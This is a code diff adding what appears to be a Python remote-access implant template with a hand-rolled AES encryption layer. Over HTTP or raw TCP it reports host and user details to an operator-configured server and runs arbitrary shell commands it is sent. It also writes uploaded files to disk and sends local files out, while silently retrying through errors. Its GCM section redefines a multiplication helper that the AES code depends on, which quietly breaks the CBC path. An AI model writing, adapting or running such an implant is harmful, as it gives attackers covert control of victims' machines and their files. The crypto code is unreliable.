@@ -1,0 +1,273 @@
+import base64, hmac, hashlib, json, os, platform, socket, struct, subprocess, time, urllib.request
+C=json.loads(base64.b64decode('{{.Config}}'))
+
+SBOX = [
+0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
+0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
+0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
+0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
+0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
+0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
+0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
+0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
+0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
+0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
+0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
+0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
+0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
+0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
+0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
+0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16]
+
+RCON = [0x01,0x02,0x04,0x08,0x10,0x20,0x40]
+
+INV_SBOX = [0] * 256
+for _i, _v in enumerate(SBOX):
+    INV_SBOX[_v] = _i
+
+
+def _xt(a):
+    a <<= 1
+    return (a ^ 0x1b) & 0xff if a & 0x100 else a
+
+
+def _mul(a, b):
+    r = 0
+    while b:
+        if b & 1:
+            r ^= a
+        a = _xt(a)
+        b >>= 1
+    return r
+
+
+def expand(key):
+    # AES-256: Nk=8, Nr=14, 60 words
+    w = [list(key[i:i + 4]) for i in range(0, 32, 4)]
+    for i in range(8, 60):
+        t = list(w[i - 1])
+        if i % 8 == 0:
+            t = t[1:] + t[:1]
+            t = [SBOX[x] for x in t]
+            t[0] ^= RCON[i // 8 - 1]
+        elif i % 8 == 4:
+            t = [SBOX[x] for x in t]
+        w.append([w[i - 8][j] ^ t[j] for j in range(4)])
+    return w
+
+
+def _shift_rows(s):
+    out = [0] * 16
+    for c in range(4):
+        for r in range(4):
+            out[c * 4 + r] = s[((c + r) % 4) * 4 + r]
+    return out
+
+
+def _mix_columns(s):
+    out = [0] * 16
+    for c in range(4):
+        a = s[c * 4:c * 4 + 4]
+        out[c * 4 + 0] = _mul(a[0], 2) ^ _mul(a[1], 3) ^ a[2] ^ a[3]
+        out[c * 4 + 1] = a[0] ^ _mul(a[1], 2) ^ _mul(a[2], 3) ^ a[3]
+        out[c * 4 + 2] = a[0] ^ a[1] ^ _mul(a[2], 2) ^ _mul(a[3], 3)
+        out[c * 4 + 3] = _mul(a[0], 3) ^ a[1] ^ a[2] ^ _mul(a[3], 2)
+    return out
+
+
+def aes256_block(block, w):
+    s = [block[i] ^ w[i // 4][i % 4] for i in range(16)]
+    for rnd in range(1, 15):
+        s = [SBOX[x] for x in s]
+        s = _shift_rows(s)
+        if rnd != 14:
+            s = _mix_columns(s)
+        s = [s[i] ^ w[rnd * 4 + i // 4][i % 4] for i in range(16)]
+    return bytes(s)
+
+
+def _inv_shift_rows(s):
+    out = [0] * 16
+    for c in range(4):
+        for r in range(4):
+            out[((c + r) % 4) * 4 + r] = s[c * 4 + r]
+    return out
+
+
+def _inv_mix_columns(s):
+    out = [0] * 16
+    for c in range(4):
+        a = s[c * 4:c * 4 + 4]
+        out[c * 4 + 0] = _mul(a[0], 14) ^ _mul(a[1], 11) ^ _mul(a[2], 13) ^ _mul(a[3], 9)
+        out[c * 4 + 1] = _mul(a[0], 9) ^ _mul(a[1], 14) ^ _mul(a[2], 11) ^ _mul(a[3], 13)
+        out[c * 4 + 2] = _mul(a[0], 13) ^ _mul(a[1], 9) ^ _mul(a[2], 14) ^ _mul(a[3], 11)
+        out[c * 4 + 3] = _mul(a[0], 11) ^ _mul(a[1], 13) ^ _mul(a[2], 9) ^ _mul(a[3], 14)
+    return out
+
+
+def aes256_decrypt(block, w):
+    s = [block[i] ^ w[14 * 4 + i // 4][i % 4] for i in range(16)]
+    for rnd in range(13, -1, -1):
+        s = _inv_shift_rows(s)
+        s = [INV_SBOX[x] for x in s]
+        s = [s[i] ^ w[rnd * 4 + i // 4][i % 4] for i in range(16)]
+        if rnd != 0:
+            s = _inv_mix_columns(s)
+    return bytes(s)
+
+
+def _pkcs7(x):
+    n = 16 - len(x) % 16
+    return x + bytes([n]) * n
+
+
+def _unpkcs7(x):
+    n = x[-1]
+    if n < 1 or n > 16:
+        raise Exception('bad padding')
+    return x[:-n]
+
+
+def derive(keyb, label):
+    return hashlib.sha256(base64.b64decode(keyb) + label.encode()).digest()
+
+
+def enc(keyb, pt):
+    import os
+    k = derive(keyb, 'enc')
+    w = expand(k)
+    iv = os.urandom(16)
+    d = _pkcs7(pt.encode())
+    ct = b''
+    prev = iv
+    for i in range(0, len(d), 16):
+        blk = [d[i + j] ^ prev[j] for j in range(16)]
+        out = aes256_block(blk, w)
+        ct += out
+        prev = out
+    mac = hmac.new(derive(keyb, 'mac'), iv + ct, hashlib.sha256).digest()
+    return base64.b64encode(iv + ct + mac).decode()
+
+
+def dec(keyb, ctb):
+    r = base64.b64decode(ctb)
+    if len(r) < 48:
+        raise Exception('short')
+    iv, ct, mac = r[:16], r[16:-32], r[-32:]
+    if not hmac.compare_digest(mac, hmac.new(derive(keyb, 'mac'), iv + ct, hashlib.sha256).digest()):
+        raise Exception('mac')
+    w = expand(derive(keyb, 'enc'))
+    d = b''
+    prev = iv
+    for i in range(0, len(ct), 16):
+        blk = ct[i:i + 16]
+        d += bytes(x ^ y for x, y in zip(aes256_decrypt(list(blk), w), prev))
+        prev = blk
+    return _unpkcs7(d).decode()
+
+# AES-GCM for explicit GCM listeners; CBC-HMAC remains available for legacy peers.
+_cbc_enc, _cbc_dec = enc, dec
+def _mul(x,y):
+ z=0
+ for i in range(128):
+  if (x>>(127-i))&1:z^=y
+  y=(y>>1)^((0xe1<<120) if y&1 else 0)
+ return z
+def _ghash(h,a):
+ y=0
+ for i in range(0,len(a),16):y=_mul(y^int.from_bytes(a[i:i+16].ljust(16,b'\0'),'big'),h)
+ return y
+def _gcm_tag(w,nonce,ct):
+ h=int.from_bytes(aes256_block([0]*16,w),'big')
+ data=ct+b'\0'*((-len(ct))%16)+struct.pack('>QQ',0,len(ct)*8)
+ v=_ghash(h,data)
+ return bytes(a^b for a,b in zip(aes256_block(list(nonce+b'\0\0\0\1'),w),v.to_bytes(16,'big')))
+def _gcm_xor(w,nonce,data):
+ out=b''
+ for i in range(0,len(data),16):
+  block=aes256_block(list(nonce+struct.pack('>I',2+i//16)),w)
+  out+=bytes(x^y for x,y in zip(data[i:i+16],block))
+ return out
+def enc(keyb,pt):
+ if C.get('envelope')!='gcm':return _cbc_enc(keyb,pt)
+ w=expand(base64.b64decode(keyb));nonce=os.urandom(12);ct=_gcm_xor(w,nonce,pt.encode())
+ return base64.b64encode(nonce+ct+_gcm_tag(w,nonce,ct)).decode()
+def dec(keyb,ctb):
+ if C.get('envelope')!='gcm':return _cbc_dec(keyb,ctb)
+ r=base64.b64decode(ctb)
+ if len(r)<28:raise ValueError('short GCM message')
+ nonce,ct,tag=r[:12],r[12:-16],r[-16:];w=expand(base64.b64decode(keyb))
+ if not hmac.compare_digest(tag,_gcm_tag(w,nonce,ct)):raise ValueError('GCM authentication failed')
+ return _gcm_xor(w,nonce,ct).decode()
+
+def run(cmd):
+ try:
+  p=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=120)
+  return p.stdout+p.stderr
+ except Exception as e:return str(e)
+def info():
+ return {'uuid':C['uuid'],'hostname':socket.gethostname(),'username':os.getenv('USER',''),'os':platform.system().lower(),'arch':platform.machine(),'pid':os.getpid(),'process_name':'python','is_admin':hasattr(os,'geteuid') and os.geteuid()==0,'internal_ip':'','sleep_secs':C['interval']}
+MODE=C.get('transport','http')
+if MODE=='http':
+ while True:
+  try:
+   m={'type':'checkin','token':C['token'],'implant':info()}
+   body=json.dumps({'d':enc(C['key'],json.dumps(m))}).encode()
+   req=urllib.request.Request(C['url'],data=body,headers={'Content-Type':'application/json','X-Implant-Token':C['token']})
+   r=json.loads(urllib.request.urlopen(req,timeout=30).read())
+   msg=json.loads(dec(C['key'],r['d']))
+   res=[]
+   for t in msg.get('tasks') or []:
+    out='';er=''
+    try:
+     if t['type']=='shell':out=run(t['command'])
+     elif t['type']=='sleep':C['interval']=int(t.get('arg') or 5)
+     elif t['type']=='exit':raise SystemExit
+     elif t['type']=='upload':open(t['path'],'wb').write(base64.b64decode(t.get('data') or ''));out='uploaded'
+     elif t['type']=='download':out=base64.b64encode(open(t['path'],'rb').read(2097153)).decode()
+    except Exception as e:er=str(e)
+    res.append({'id':t['id'],'output':out,'error':er,'status':'failed' if er else 'success'})
+   if res:
+    m={'type':'result','session_id':msg.get('session_id'),'results':res}
+    body=json.dumps({'d':enc(C['key'],json.dumps(m))}).encode()
+    urllib.request.urlopen(urllib.request.Request(C['url'],data=body,headers={'Content-Type':'application/json','X-Implant-Token':C['token']}),timeout=30).read()
+  except Exception:pass
+  time.sleep(max(1,min(3600,int(C['interval']))))
+else:
+ while True:
+  try:
+   s=socket.create_connection((C['host'],int(C['port'])),timeout=30)
+   m={'type':'checkin','token':C['token'],'implant':info()}
+   p=json.dumps({'d':enc(C['key'],json.dumps(m))}).encode()
+   s.sendall(struct.pack('>I',len(p))+p)
+   while True:
+    h=b''
+    while len(h)<4:
+     x=s.recv(4-len(h))
+     if not x:raise Exception('closed')
+     h+=x
+    n=struct.unpack('>I',h)[0];b=b''
+    if n<1 or n>4194304:raise ValueError('frame too large')
+    while len(b)<n:
+     x=s.recv(n-len(b))
+     if not x:raise Exception('closed')
+     b+=x
+    msg=json.loads(dec(C['key'],json.loads(b)['d']))
+    res=[]
+    for t in msg.get('tasks') or []:
+     out='';er=''
+     try:
+      if t['type']=='shell':out=run(t['command'])
+      elif t['type']=='sleep':C['interval']=int(t.get('arg') or 5)
+      elif t['type']=='exit':raise SystemExit
+      elif t['type']=='upload':open(t['path'],'wb').write(base64.b64decode(t.get('data') or ''));out='uploaded'
+      elif t['type']=='download':out=base64.b64encode(open(t['path'],'rb').read(2097153)).decode()
+     except Exception as e:er=str(e)
+     res.append({'id':t['id'],'output':out,'error':er,'status':'failed' if er else 'success'})
+    rm={'type':'result','session_id':msg.get('session_id'),'results':res} if res else {'type':'beacon','session_id':msg.get('session_id')}
+    p=json.dumps({'d':enc(C['key'],json.dumps(rm))}).encode()
+    s.sendall(struct.pack('>I',len(p))+p)
+  except Exception:
+   try:s.close()
+   except Exception:pass
+   time.sleep(max(1,min(3600,int(C['interval']))))
